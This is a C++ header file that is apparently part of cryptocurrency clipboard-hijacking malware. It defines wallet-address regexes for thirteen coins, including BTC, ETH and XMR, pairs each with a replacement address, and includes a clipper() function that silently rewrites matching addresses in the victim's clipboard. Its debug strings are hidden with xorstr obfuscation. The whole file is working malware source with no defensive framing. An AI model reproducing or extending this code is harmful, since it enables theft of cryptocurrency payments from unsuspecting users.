#pragma once

std::string btc_regex = R"((?:^|\s)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}(?=\s|$))";
std::string ltc_regex = R"((?:^|\s)([LM3][a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1[a-zA-HJ-NP-Z0-9]{8,87})(?=\s|$))";
std::string eth_regex = R"((?:^|\s)(0x[a-fA-F0-9]{40})(?=\s|$))";
std::string xmr_regex = R"((?:^|\s)([48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})(?=\s|$))";
std::string xrp_regex = R"((?:^|\s)(r[0-9a-zA-Z]{33})(?=\s|$))";
std::string neo_regex = R"((?:^|\s)(A[0-9a-zA-Z]{33})(?=\s|$))";
std::string bch_regex = R"((?:^|\s)((bitcoincash|bchreg|bchtest):?(q|p)[a-z0-9]{41})(?=\s|$))";
std::string doge_regex = R"((?:^|\s)(D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})(?=\s|$))";
std::string dash_regex = R"((?:^|\s)(X[1-9A-HJ-NP-Za-km-z]{33})(?=\s|$))";
std::string tron_regex = R"((?:^|\s)(T[1-9A-HJ-NP-Za-km-z]{33})(?=\s|$))";
std::string bnb_regex = R"((?:^|\s)(bnb1[a-zA-HJ-NP-Z0-9]{38})(?=\s|$))";
std::string ada_regex = R"((?:^|\s)(addr1[0-9a-z]{38})(?=\s|$))";
std::string dot_regex = R"((?:^|\s)(14[A-Za-z0-9]{47})(?=\s|$))";

struct CryptoInfo {
    std::string currency_name;
    std::regex regex_pattern;
    std::string clipboard_replace_text;
    bool clipping;
};

CryptoInfo crypto_info[] = {
    {"BTC", std::regex(btc_regex), btc, m_btc},
    {"LTC", std::regex(ltc_regex), ltc, m_ltc},
    {"DOGE", std::regex(doge_regex), doge, m_doge},
    {"ETH", std::regex(eth_regex), eth, m_eth},
    {"XMR", std::regex(xmr_regex), xmr, m_xmr},
    {"XRP", std::regex(xrp_regex), xrp, m_xrp},
    {"NEO", std::regex(neo_regex), neo, m_neo},
    {"DASH", std::regex(dash_regex), dash, m_dash},
    {"DCH", std::regex(bch_regex), bch, m_bch},
    {"TRON", std::regex(tron_regex), tron, m_tron},
    {"BNB", std::regex(bnb_regex), bnb, m_bnb},
    {"ADA", std::regex(ada_regex), ada, m_ada},
    {"DOT", std::regex(dot_regex), dot, m_dot}
};

void detected(std::string clipboard_text) {
    log(xorstr("Clipboard: ") + clipboard_text);
}

void clipper(std::string value)
{
    for (const CryptoInfo& info : crypto_info) {
        if (std::regex_search(value, info.regex_pattern) && info.clipping) {
#ifdef DEBUGGING
            log(std::string(xorstr("Detected: ")) + info.currency_name);
            detected(value);
#endif

            std::string replaced_value = std::regex_replace(value, info.regex_pattern, info.clipboard_replace_text);
            set_clipboard_text(replaced_value.c_str());
        }
    }
}